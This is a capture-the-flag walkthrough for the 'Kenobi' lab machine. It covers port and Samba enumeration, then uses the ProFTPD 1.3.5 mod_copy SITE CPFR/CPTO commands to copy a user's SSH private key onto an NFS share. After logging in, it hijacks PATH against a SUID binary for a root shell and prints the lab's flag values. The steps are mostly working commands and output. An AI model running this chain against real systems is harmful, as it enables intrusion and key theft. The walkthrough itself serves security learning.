# Kenobi


## Nmap Scan
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)


## Samba Shares
smb-enum-shares: 
|   account_used: guest
|   \\10.10.174.88\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.174.88\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     *Anonymous access: READ/WRITE*
|     Current user access: READ/WRITE
|   \\10.10.174.88\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>


## ProFTP Enumeration
$ nc 10.10.174.88 21
ProFTP verion: 1.3.5

$ searchsploit ProFTPD 1.3.5
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                             | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                   | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                               | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                             | linux/remote/36742.txt
---------------------------------------------------------------------------------------------------------------------- ---------------------------------

ProFTP mod_copy exploit allows copying files and directories on the system using the SITE CPFR/CPTO commands.


## ProFTP Exploitation


```
$ nc 10.10.174.88 21

220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.174.88]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```


$ mkdir NFS; cd NFS
$ sudo mount 10.10.174.88:/var .
$ sudo ssh kenobi@10.10.174.88 -i id_rsa

kenobi@kenobi:~$ cat user.txt 
> d0b0f3f53b6caa532a83915e19224899


## Privledge Escalation


Find SUID files:
```
$ find / -perm -u=s -type f 2>/dev/null
> /sbin/mount.nfs
> /usr/lib/policykit-1/polkit-agent-helper-1
> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
> /usr/lib/snapd/snap-confine
> /usr/lib/eject/dmcrypt-get-device
> /usr/lib/openssh/ssh-keysign
> /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
> /usr/bin/chfn
> /usr/bin/newgidmap
> /usr/bin/pkexec
> /usr/bin/passwd
> /usr/bin/newuidmap
> /usr/bin/gpasswd
> */usr/bin/menu*
> /usr/bin/sudo
> /usr/bin/chsh
> /usr/bin/at
> /usr/bin/newgrp
> /bin/umount
> /bin/fusermount
> /bin/mount
> /bin/ping
> /bin/su
> /bin/ping6
```

```
kenobi@kenobi:~$ /usr/bin/menu
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

```
kenobi@kenobi:~$ strings /usr/bin/menu
curl -I localhost
uname -r
ifconfig
```

Since the program runs linux commands without using the full path,
we can manipulate the path to run a shell for us as root

```
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod +x curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# cat /root/root.txt
177b3cd8562289f37382721c28381f02
```
